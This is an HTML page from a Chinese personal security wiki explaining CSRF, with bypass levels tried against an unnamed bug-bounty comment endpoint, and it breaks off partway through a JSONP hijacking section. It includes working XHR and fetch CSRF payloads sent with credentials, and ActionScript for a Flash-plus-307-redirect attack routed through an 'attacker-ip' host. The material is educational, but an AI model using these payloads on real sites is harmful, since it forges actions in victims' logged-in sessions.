@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          WebSecurity-Csrf - 信息安全个人wiki&amp;blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>信息安全个人WIKI&amp;BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+<li><a href="/about">About</a></li>
+<li><a href="/note">Notes</a></li>
+</ul>
+<h1 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a><strong>web安全</strong></h1><h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><ul>
+<li><a href="/contents/xss">WebSecurity-xss</a></li>
+<li><a href="/contents/csrf">WebSecurity-csrf</a></li>
+<li><a href="/contents/ssrf">WebSecurity-ssrf</a></li>
+<li><a href="/contents/FI">WebSecurity-FI</a></li>
+<li><a href="/contents/rce">WebSecurity-rce</a></li>
+<li><a href="/contents/upload">WebSecurity-upload</a></li>
+<li><a href="/contents/xxe">WebSecurity-xxe</a></li>
+</ul>
+<h2 id="labs"><a href="#labs" class="headerlink" title="labs"></a>labs</h2><ul>
+<li><a href="/contents/xsslabs">xss-demo项目练习</a></li>
+<li><a href="/contents/sqllabs">sql-labs项目练习</a></li>
+<li><a href="/contents/uploadlabs">upload-labs系列write-up</a></li>
+<li><a href="/contents/code-breaking">code-breaking write-up</a></li>
+</ul>
+<h2 id="CTF-amp-AWD"><a href="#CTF-amp-AWD" class="headerlink" title="CTF&amp;AWD"></a>CTF&amp;AWD</h2><ul>
+<li><a href="/contents/awd">百越杯AWD攻防源码复现分析</a></li>
+<li><a href="/contents/jarvis">Jarvis oj web部分write-up</a></li>
+<li><a href="/contents/babyphp">hacklu_CTF2018 write up</a></li>
+<li><a href="/contents/suctf">suctf招新赛web全题解</a></li>
+<li><a href="/contents/shanghai">骇极杯CTF Write up</a></li>
+<li><a href="/contents/wangding">2018网鼎杯web部分write-up合集</a></li>
+</ul>
+<h2 id="实战-amp-总结"><a href="#实战-amp-总结" class="headerlink" title="实战&amp;总结"></a>实战&amp;总结</h2><ul>
+<li><a href="/contents/login">登录框渗透总结</a></li>
+<li><a href="/contents/logic">登录逻辑漏洞总结</a></li>
+<li><a href="/contents/unauthorized">未授权访问渗透总结</a></li>
+<li><a href="/contents/mysql-fileread">mysql客户端读取漏洞</a></li>
+</ul>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a><strong>内网渗透</strong></h1><ul>
+<li>待补充</li>
+</ul>
+<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a><strong>代码审计</strong></h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><ul>
+<li><a href="/contents/variable">代码审计基础之变量覆盖漏洞</a></li>
+<li><a href="/contents/injection">代码审计基础之命令注入函数</a></li>
+<li><a href="/contents/serialize">代码审计基础之php反序列化</a></li>
+</ul>
+<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><ul>
+<li>待补充</li>
+</ul>
+<h1 id="安全开发"><a href="#安全开发" class="headerlink" title="安全开发"></a><strong>安全开发</strong></h1><ul>
+<li><a href="/contents/tools">一些工具的使用命令</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <p>仅以此文系统的学习一下csrf漏洞，包括其原理，分类，绕过方式，防御方式<a id="more"></a> </p>
+<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><h3 id="csrf是什么？"><a href="#csrf是什么？" class="headerlink" title="csrf是什么？"></a>csrf是什么？</h3><p>csrf即跨站请求伪造，利用的是网站对用户网页浏览器的信任，利用受害者尚未失效的身份认证信息，诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向服务器发送请求，从而完成非法操作（如转账、改密等）。</p>
+<h3 id="csrf的危害"><a href="#csrf的危害" class="headerlink" title="csrf的危害"></a>csrf的危害</h3><p>给其他用户造成不知情的操作，越权支付等，越权添加管理员等</p>
+<h3 id="csrf常见出现漏洞的地方"><a href="#csrf常见出现漏洞的地方" class="headerlink" title="csrf常见出现漏洞的地方"></a>csrf常见出现漏洞的地方</h3><p>在我看来任何一个功能点，包括增删改查，都可能存在csrf</p>
+<ol>
+<li>修改敏感信息处(密码)</li>
+<li>删除信息处</li>
+<li>绑定敏感信息处(绑定手机号)</li>
+<li>发送信息处</li>
+<li>订单下单处</li>
+</ol>
+<h3 id="csrf的攻击流程"><a href="#csrf的攻击流程" class="headerlink" title="csrf的攻击流程"></a>csrf的攻击流程</h3><p>删除referer，origin等测试发现存在csrf的地方—-》burp自动生成poc/json csrf—–》发送给受害者—–》受害者点击我们发送的html 攻击完成</p>
+<h2 id="0x02-csrf的分类"><a href="#0x02-csrf的分类" class="headerlink" title="0x02 csrf的分类"></a>0x02 csrf的分类</h2><h3 id="写入型csrf"><a href="#写入型csrf" class="headerlink" title="写入型csrf"></a>写入型csrf</h3><p>普通的不多说，这里介绍下一种复杂的json csrf</p>
+<h4 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h4><p>在某某src进行渗透测试的过程中，发现一个评论的地方并没有对次数进行限制且在数据区域也没有token的字眼，因此猜测此处存在csrf漏洞，于是就开始了漫长的学习之旅</p>
+<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>CSRF：关于csrf漏洞相信大家都有了解，而且百度 google大部分都比我讲的好，这里我就不解释了，贴张图把</p>
+<p><img src="/img/csrf_1.jpg" alt=""></p>
+<p>Json CSRF:通常我们的csrf都是在get请求或者post数据包中构造类似于param=value的字眼提交给服务器，服务器得到数据，处理请求，而json csrf传上去的值是一串json数据，相比于普通的csrf，json的数据往往更难构造</p>
+<h4 id="某某src"><a href="#某某src" class="headerlink" title="某某src"></a>某某src</h4><p>在测试时发现评论的数据包如下图:</p>
+<p><img src="/img/csrf_2.png" alt=""></p>
+<p>刚开始，看到下面POST的数据里面并没有token的字眼，而且在repeater中重放也可以评论多条，于是认为可能存在csrf漏洞，准备构造payload的时候才看到这里在头部进行了检测，因此此处是不存在csrf漏洞的</p>
+<h4 id="陷入思考"><a href="#陷入思考" class="headerlink" title="陷入思考"></a>陷入思考</h4><p>如果我们假设这个头部不存在token的情况下，我们要怎么完成一次csrf攻击呢？(以下的头部都默认手动加上token方便调试和研究)</p>
+<h5 id="level1："><a href="#level1：" class="headerlink" title="level1："></a>level1：</h5><p>最简单的，通过form表单发送一个请求，burpsuite有直接写好的插件，保存到本地，点开即可</p>
+<p><img src="/img/csrf_3.png" alt=""></p>
+<p>我们抓包分析一下</p>
+<p><img src="/img/csrf_4.png" alt=""></p>
+<p>和之前的包进行对比，可以看到两处的Accept、Content-Type不同，同时数据处多出来一个等号，其中其主要作用的是Content-Type我们修改过来尝试下</p>
+<p><img src="/img/csrf_5.png" alt=""></p>
+<p>很明显 这里有几个问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、简单的form表单无法伪造Content-Type头部</span><br><span class="line">2、post数据包多出一个等号</span><br></pre></td></tr></table></figure>
+
+<p>一些服务器若是不检测Content-Type头部且不需要正确格式的json则可用这种方法</p>
+<h5 id="level2："><a href="#level2：" class="headerlink" title="level2："></a>level2：</h5><p>我们可以在form表单里面，给value赋值，若是漏洞页面可以识别多余的key value那么这种方法是可行的</p>
+<p>实测这个页面不行 会爆500错误</p>
+<p><img src="/img/csrf_6.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里我们虽然缓解了第二个问题 但是第一个问题还是存在</span><br></pre></td></tr></table></figure>
+
+<h5 id="level3"><a href="#level3" class="headerlink" title="level3:"></a>level3:</h5><p>能够自定义头部的有两种办法</p>
+<p>1、利用XHR进行提交  </p>
+<p>关于XHR可以去这边了解下<a href="https://en.wikipedia.org/wiki/XMLHttpRequest" target="_blank" rel="noopener">XMLHttpRequest</a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">      <span class="function"><span class="keyword">function</span> <span class="title">submitRequest</span><span class="params">()</span></span></span></span><br><span class="line">      &#123;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">        xhr.open(<span class="string">"POST"</span>, <span class="string">"https://xxx.xxx.com.cn/xxx/v3/subReply"</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Accept"</span>, <span class="string">"*/*"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Accept-Language"</span>, <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/json; charset=utf-8"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.withCredentials = <span class="literal">true</span>; <span class="comment">//携带cookie</span></span></span><br><span class="line"><span class="javascript">        xhr.send(<span class="built_in">JSON</span>.stringify(&#123;<span class="string">"postId"</span>:<span class="string">"10000003"</span>,<span class="string">"content"</span>:<span class="string">"test1"</span>&#125;));</span></span><br><span class="line">	   &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"#"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> <span class="attr">onclick</span>=<span class="string">"submitRequest();"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>抓包分析会先给服务器发送一个发送预检请求(OPTIONS请求)给服务端征求支持的请求方法，然后根据服务端响应允许才发送真正的请求。</p>
+<p><img src="/img/csrf_7.png" alt=""></p>
+<p>可以看到头部设置成了我们想要的结果，加上token后评论成功，来到前端查看也有了这条评论</p>
+<p><img src="/img/csrf_8.png" alt=""></p>
+<p>2、利用fetch请求提交</p>
+<p>fetch请求和xhr一样也会发出一个OPTIONS请求</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    fetch(<span class="string">'https://xxx.xxx.com.cn/xxx/v3/subReply'</span>, &#123;method: <span class="string">'POST'</span>, credentials: <span class="string">'include'</span>, headers: &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/json; charset=utf-8'</span>&#125;, body: <span class="string">'&#123;"postId":"10000003","content":"test2"&#125;'</span>&#125;);</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/csrf_9.png" alt=""></p>
+<p>可以看到这个方法也得到了我们想要的结果</p>
+<p><img src="/img/csrf_10.png" alt=""></p>
+<p>但是这两种方法都有一个毛病：需要用options请求试水，如果对方服务器不响应这个请求的话那么此次csrf攻击将失败</p>
+<h5 id="level4"><a href="#level4" class="headerlink" title="level4:"></a>level4:</h5><p>flash的跨域 + 307跳转</p>
+<p><img src="/img/csrf_11.png" alt=""></p>
+<p>那么这种方法的原理到底是什么呢？</p>
+<p>首先我们需要了解flash：Adobe Flash可用于使用ActionScript制作Web请求，而ActionScript还可以用于为Web请求设置自定义的HTTP头。</p>
+<p>一般来说Flash不会向没有crossdomain.xml文件的服务器发出请求，对方服务器是不可控的，因此为了完全避免跨域文件，我们在自己服务器上先准备一个flash文件和一个重定向文件。</p>
+<p>我们使用Flash和我们的POST有效载荷向重定向文件发出请求。然后该文件充当重定向器，将请求转到我们想要攻击的服务器上。</p>
+<p>HTTP状态码307：HTTP 307可以确保在重定向请求发生时请求方法和请求主体不会发生改变。</p>
+<p>也就是说我们通过重定向文件转发的请求是完完全全不变的转发过去的包括Body和HTTP头</p>
+<p><img src="/img/csrf_12.png" alt=""></p>
+<p>所以我们目前需要一个.swf的flash文件和一个重定向文件</p>
+<ol>
+<li>要创建发出Web请求的csrf.swf 的 Flash文件，具体步骤如下</li>
+<li>从Adobe官网安装<a href="https://www.adobe.com/devnet/flex/flex-sdk-download.html" target="_blank" rel="noopener">Flex SDK</a>用于将ActionScript编译为swf文件。Flex需要安装32位JVM，可以从Oracle官网下载安装32位的JDK。</li>
+<li>创建一个名为csrf.as的文本文件，其中包含下面给出的ActionScript代码。</li>
+<li>将<attacker-ip>占位符替换为生成Flash文件所在的系统的IP地址/域名（攻击者服务器）。</li>
+<li>要将此文件编译为csrf.swf，只需运行mxmlc  csrf.as命令。这将创建一个名为csrf.swf的文件。</li>
+</ol>
+<p><img src="/img/csrf_13.png" alt=""></p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">import</span> flash.display.Sprite;</span><br><span class="line">  <span class="keyword">import</span> flash.net.URLLoader;</span><br><span class="line">  <span class="keyword">import</span> flash.net.URLRequest;</span><br><span class="line">  <span class="keyword">import</span> flash.net.URLRequestHeader;</span><br><span class="line">  <span class="keyword">import</span> flash.net.URLRequestMethod;public class csrf extends Sprite</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">public</span> function csrf()</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">super</span>();</span><br><span class="line">      <span class="keyword">var</span> member1:<span class="type">Object</span> = null;</span><br><span class="line">      <span class="keyword">var</span> myJson:<span class="type">String</span> = null;</span><br><span class="line">      member1 = new <span class="type">Object</span>();</span><br><span class="line">      member1 = &#123;<span class="string">"postId"</span>:<span class="string">"10000003"</span>,<span class="string">"content"</span>:<span class="string">"test3"</span>&#125;</span><br><span class="line">      <span class="keyword">var</span> myData:<span class="type">Object</span> = member1;</span><br><span class="line">      myJson = <span class="type">JSON</span>.stringify(myData);</span><br><span class="line">      myJson = <span class="type">JSON</span>.stringify(myData);</span><br><span class="line">      <span class="keyword">var</span> url:<span class="type">String</span> = <span class="string">"http://attacker-ip/test.php"</span>;</span><br><span class="line">      <span class="keyword">var</span> request:<span class="type">URLRequest</span> = new <span class="type">URLRequest</span>(url);</span><br><span class="line">      request.requestHeaders.push(new <span class="type">URLRequestHeader</span>(<span class="string">"Content-  Type"</span>,<span class="string">"application/json"</span>));</span><br><span class="line">      request.data = myJson;</span><br><span class="line">      request.method = <span class="type">URLRequestMethod</span>.<span class="type">POST</span>;</span><br><span class="line">      <span class="keyword">var</span> urlLoader:<span class="type">URLLoader</span> = new <span class="type">URLLoader</span>();<span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">          urlLoader.load(request);</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span>(e:<span class="type">Error</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          trace(e);</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>具体攻击流程如下：</p>
+<ol>
+<li>用户在浏览器中登录到<a href="http://victim-site/" target="_blank" rel="noopener">http://victim-site/</a></li>
+<li>受害者被诱骗导航到 <a href="http://attacker-ip/csrf.swf" target="_blank" rel="noopener">http://attacker-ip/csrf.swf</a></li>
+<li>加载flash文件，用有效载荷和自定义HTTP头向 <a href="http://attacker-ip/test.php" target="_blank" rel="noopener">http://attacker-ip/test.php</a>  发起POST请求</li>
+<li>攻击者服务器发出HTTP 307重定向响应。这会导致POST响应body和自定义HTTP头按原样发送到 <a href="http://victim-site/" target="_blank" rel="noopener">http://victim-site/</a></li>
+<li>用户刷新他的 <a href="http://victim-site/" target="_blank" rel="noopener">http://victim-site/</a>  页面，发现他评论了别人</li>
+</ol>
+<p>由于这个src有设置token所以不能利用成功</p>
+<p>附一个别人已经造好的轮子</p>
+<p><a href="http://cm2.pw/crossdomain" target="_blank" rel="noopener">http://cm2.pw/crossdomain</a></p>
+<p><img src="/img/csrf_14.png" alt=""></p>
+<h3 id="读取型csrf"><a href="#读取型csrf" class="headerlink" title="读取型csrf"></a>读取型csrf</h3><p>读取型csrf和写入型csrf最大的区别是：</p>
+<p>一种是在你不知情的情况进行某些操作</p>
+<p>一种是在你不知情的情况下盗取某些数据</p>
+<h4 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同源策略（Same origin policy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。</span><br></pre></td></tr></table></figure>
+
+<p>这个应该很好理解吧，不是我自己的东西我当然不属于我啦。</p>
+<p>那么什么才认为是同源的呢？</p>
+<p><strong>所谓同源是指，域名，协议，端口相同。</strong></p>
+<p>你比如说http和https就不同源，aa.com和bb.com也不同源aa.com:80和aa.com:81也不同源等等</p>
+<p>只有当三者都相同是才可以互相引用同源中的对象</p>
+<p>显然这是麻烦的，我们很多时候都想做到资源共享那么有什么办法绕过这个安全策略呢</p>
+<p>目前最主流的三种<code>1.跨域资源共享(CORS) 2.JSONP跨域 3.降域 document.domain</code></p>
+<h4 id="jsonp跨域劫持"><a href="#jsonp跨域劫持" class="headerlink" title="jsonp跨域劫持"></a>jsonp跨域劫持</h4><p>首先我们看看什么是jsonp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">带填充的JSON,是一种可以在JS中绕过同源策略，并发起跨域HTTP请求的使用模式，可以启动JS的跨域HTTP请求</span><br><span class="line">同源策略有一个显著的例外，HTML脚本元素是可以规避SOP检查的。那就意味着我们可以采用动态注入脚本的方式向其他源发出HTTP请求。JSONP正是利用了这个例外情况进行跨域数据加载的。</span><br></pre></td></tr></table></figure>
+
+<p>在我看来，产生jsonp这个模式主要有两个原因</p>
+<ol>
+<li><p>Web页面上调用js文件时则不受是否跨域的影响</p>
+</li>
+<li><p>js支持回调函数的调用</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">客户端：</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data.name)  </span><br><span class="line">&#125;;</span><br><span class="line">服务器:</span><br><span class="line">foo(&#123;<span class="attr">name</span>:<span class="string">"comical"</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>此时客户端会调用回调函数，把json数据传到data里面去</p>
+<p>这里我们用docker来进行实验</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务端：8002端口</span><br><span class="line">客户端：8001端口</span><br></pre></td></tr></table></figure>
+
+<h5 id="example1"><a href="#example1" class="headerlink" title="example1"></a>example1</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//服务器端</span></span><br><span class="line">alert(<span class="string">'I\'m in server'</span>);</span><br><span class="line"><span class="comment">//客户端</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;JSONP example&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"http://39.108.154.166:8002/remote.js"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:/%E6%9C%AA%E5%88%86%E7%B1%BB/samaorigin/2.png" alt=""></p>
+<p>可以看到我们跨域执行了js脚本</p>
+<h5 id="example2"><a href="#example2" class="headerlink" title="example2"></a>example2</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//服务器端</span></span><br><span class="line">comical(&#123;<span class="string">"result"</span>:<span class="string">"I\'m data in server"</span>&#125;);</span><br><span class="line"><span class="comment">//客户端</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;JSONP example&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">        &lt;script type = <span class="string">"text/javascript"</span>&gt;</span><br><span class="line">        <span class="keyword">var</span> comical = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                alert(<span class="string">'I am in local func,now we can recive server\'s data:'</span>+data.result);</span><br><span class="line">        &#125;</span><br><span class="line">        &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">    &lt;script type="text/</span>javascript<span class="string">" src="</span>http:<span class="comment">//39.108.154.166:8002/remote.js"&gt;&lt;/script&gt;</span></span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:/%E6%9C%AA%E5%88%86%E7%B1%BB/samaorigin/3.png" alt=""></p>
+<p>这即是一个jsonp的小例子，回调函数处理了remote.js回显的数据并为自己所用</p>
+<h5 id="example3"><a href="#example3" class="headerlink" title="example3"></a>example3</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//服务器端</span></span><br><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">$jsoncallback = htmlspecialchars($_REQUEST [<span class="string">'jsoncallback'</span>]);</span><br><span class="line">$json_data = <span class="string">'["customername1","customername2"]'</span>;</span><br><span class="line">echo $jsoncallback . <span class="string">"("</span> . $json_data . <span class="string">")"</span>;</span><br><span class="line">?&gt;</span><br><span class="line"><span class="comment">//客户端</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;JSONP example&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">        &lt;div id =<span class="string">"divCustomers"</span>&gt;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;script type = "text/</span>javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        function comical(result)</span></span><br><span 